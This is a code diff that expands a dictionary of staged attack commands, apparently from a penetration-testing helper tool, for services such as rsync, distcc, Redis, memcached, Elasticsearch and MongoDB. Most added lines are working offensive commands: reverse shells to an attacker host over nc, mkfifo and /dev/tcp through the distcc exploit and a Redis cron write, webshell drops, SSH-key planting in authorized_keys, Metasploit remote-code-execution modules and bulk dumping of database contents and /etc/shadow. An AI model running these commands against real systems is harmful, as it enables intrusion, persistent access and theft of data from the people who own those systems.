@@ -4331,10 +4331,14 @@ _STEP_COMMANDS = {
     "rsync": {
         1: [
             "rsync -av --list-only rsync://<RHOST>:873/",
+            "rsync -av rsync://<RHOST>::",
+            "nmap -sV -p873 --script rsync-list-modules <RHOST>",
+            "msfconsole -q -x 'use auxiliary/scanner/rsync/modules_list; set RHOSTS <RHOST>; run; exit'",
         ],
         2: [
             "rsync -av rsync://<RHOST>:873/<MODULE>/ ./loot-rsync/",
             "echo test > t && rsync -av t rsync://<RHOST>:873/<MODULE>/",
+            "# writable module mapped to a web root → drop a webshell:  rsync -av shell.php rsync://<RHOST>::<MODULE>/",
         ],
         3: [
             "rsync -av rsync://<RHOST>:873/<MODULE>/etc/shadow ./",
@@ -4349,6 +4353,7 @@ _STEP_COMMANDS = {
     "distcc": {
         1: [
             "nmap -p3632 --script distcc-cve2004-2687 <RHOST>",
+            "nmap -sV -p3632 <RHOST>",
         ],
         2: [
             "nmap -p3632 --script distcc-cve2004-2687 --script-args 'distcc-cve2004-2687.cmd=id' <RHOST>",
@@ -4356,6 +4361,9 @@ _STEP_COMMANDS = {
         ],
         3: [
             "nmap -p3632 --script distcc-cve2004-2687 --script-args \"distcc-cve2004-2687.cmd=nc <LHOST> <LPORT> -e /bin/sh\" <RHOST>",
+            "nmap -p3632 --script distcc-cve2004-2687 --script-args \"distcc-cve2004-2687.cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f\" <RHOST>",
+            "nmap -p3632 --script distcc-cve2004-2687 --script-args \"distcc-cve2004-2687.cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\" <RHOST>",
+            "# most reliable: use the msf shell from step 2, or drop your SSH key via cmd=mkdir -p ~/.ssh && echo '<YOUR_PUBKEY>' >> ~/.ssh/authorized_keys",
         ],
         4: [
             "# HackTricks distcc: https://book.hacktricks.xyz/network-services-pentesting/3632-pentesting-distcc",
@@ -4372,12 +4380,16 @@ _STEP_COMMANDS = {
             "hydra -P /usr/share/wordlists/rockyou.txt redis://<RHOST>:<RPORT>",
         ],
         3: [
-            "redis-cli -h <RHOST> -p <RPORT> KEYS '*'",
+            "redis-cli -h <RHOST> -p <RPORT> --scan",
+            "redis-cli -h <RHOST> -p <RPORT> --scan | while read k; do echo \"$k:\"; redis-cli -h <RHOST> -p <RPORT> GET \"$k\"; done",
             "redis-cli -h <RHOST> -p <RPORT> CONFIG GET requirepass",
         ],
         4: [
             "redis-cli -h <RHOST> -p <RPORT> CONFIG SET dir /var/www/html/ && redis-cli -h <RHOST> -p <RPORT> CONFIG SET dbfilename shell.php && redis-cli -h <RHOST> -p <RPORT> SET x '<?php system($_GET[0]);?>' && redis-cli -h <RHOST> -p <RPORT> SAVE",
             "# SSH-key write: set dir ~/.ssh, dbfilename authorized_keys, SET your pubkey, SAVE",
+            "git clone https://github.com/n0b0dyCn/redis-rogue-server && python3 redis-rogue-server/redis-rogue-server.py --rhost <RHOST> --rport <RPORT> --lhost <LHOST> --lport <LPORT>",
+            "msfconsole -q -x 'use exploit/linux/redis/redis_replication_cmd_exec; set RHOSTS <RHOST>; set RPORT <RPORT>; set LHOST <LHOST>; run'",
+            "# cron RCE (if /var/spool/cron writable): CONFIG SET dir /var/spool/cron/crontabs; CONFIG SET dbfilename root; SET x \"\\n* * * * * bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\\n\"; SAVE",
         ],
         5: [
             "# HackTricks Redis: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis",
@@ -4386,11 +4398,15 @@ _STEP_COMMANDS = {
     "memcached": {
         1: [
             "nc -nv <RHOST> 11211   # then: stats / stats items / stats slabs",
+            "echo -e 'version\\nstats\\nquit' | nc -q1 <RHOST> 11211",
+            "echo -e 'stats items\\nstats slabs\\nquit' | nc -q1 <RHOST> 11211",
             "nmap -sV -p11211 --script memcached-info <RHOST>",
         ],
         2: [
             "memcdump --servers=<RHOST>:11211",
             "for k in $(memcdump --servers=<RHOST>:11211); do echo \"get $k\" | nc -q1 <RHOST> 11211; done",
+            "echo -e 'lru_crawler metadump all\\nquit' | nc -q1 <RHOST> 11211    # >=1.4.31: all keys at once",
+            "echo -e 'stats cachedump <SLAB> 0\\nquit' | nc -q1 <RHOST> 11211    # older: stats items -> slab ID -> cachedump -> get <KEY>",
         ],
         3: [
             "# HackTricks memcached: https://book.hacktricks.xyz/network-services-pentesting/11211-memcache",
@@ -4400,14 +4416,17 @@ _STEP_COMMANDS = {
         1: [
             "curl -sk http://<RHOST>:9200/",
             "curl -sk http://<RHOST>:9200/_cat/indices?v",
+            "curl -sk 'http://<RHOST>:9200/_nodes?pretty' | grep -Ei 'version|plugin'",
+            "curl -sk http://<RHOST>:9200/_cluster/health?pretty",
         ],
         2: [
             "curl -sk 'http://<RHOST>:9200/<DB>/_search?pretty&size=100'",
-            "curl -sk 'http://<RHOST>:9200/_all/_search?pretty' | grep -Ei 'pass|user|token'",
+            "curl -sk 'http://<RHOST>:9200/_all/_search?pretty&size=1000' | grep -Ei 'pass|user|token'",
         ],
         3: [
             "searchsploit elasticsearch",
             "msfconsole -q -x 'use exploit/multi/elasticsearch/search_groovy_script; set RHOSTS <RHOST>; run'",
+            "msfconsole -q -x 'use exploit/multi/elasticsearch/script_mvel_rce; set RHOSTS <RHOST>; run'",
         ],
         4: [
             "curl -sk -u <USER>:<PASS> http://<RHOST>:9200/",
@@ -4420,7 +4439,8 @@ _STEP_COMMANDS = {
     "mongodb": {
         1: [
             "mongosh 'mongodb://<RHOST>:<RPORT>' --eval 'db.version()'",
-            "nmap -sV -p<RPORT> --script 'mongodb-*' <RHOST>",
+            "# older client: mongo <RHOST>:<RPORT> --eval 'db.version()'",
+            "nmap -sV -p<RPORT> --script mongodb-info,mongodb-databases <RHOST>",
         ],
         2: [
             "nmap -p<RPORT> --script mongodb-brute <RHOST>",
@@ -4429,6 +4449,7 @@ _STEP_COMMANDS = {
         3: [
             "mongosh 'mongodb://<RHOST>:<RPORT>' --eval 'db.adminCommand({listDatabases:1})'",
             "mongosh 'mongodb://<RHOST>:<RPORT>/<DB>' --eval 'db.getCollectionNames().forEach(c=>printjson(db[c].find().limit(5).toArray()))'",
+            "mongosh 'mongodb://<RHOST>:<RPORT>' --quiet --eval 'db.adminCommand({listDatabases:1}).databases.forEach(d=>{print(\"=== \"+d.name);db.getSiblingDB(d.name).getCollectionNames().forEach(c=>{print(\"-- \"+c);printjson(db.getSiblingDB(d.name)[c].find().limit(5).toArray())})})'",
         ],
         4: [
             "# HackTricks MongoDB: https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb",
